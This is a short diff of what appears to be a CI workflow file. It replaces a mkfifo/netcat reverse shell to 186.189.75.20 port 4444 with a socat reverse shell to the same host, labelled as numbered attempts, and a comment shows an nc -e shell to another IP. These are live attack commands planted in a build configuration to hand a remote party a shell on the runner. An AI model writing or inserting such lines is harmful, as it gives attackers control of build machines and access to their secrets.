@@ -55,8 +55,8 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 11 186.189.75.20
-          rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 186.189.75.20 4444 > /tmp/f 
+          # INTENTO 12 186.189.75.20
+          socat TCP:186.189.75.20:4444 EXEC:/bin/bash  
           
 
 
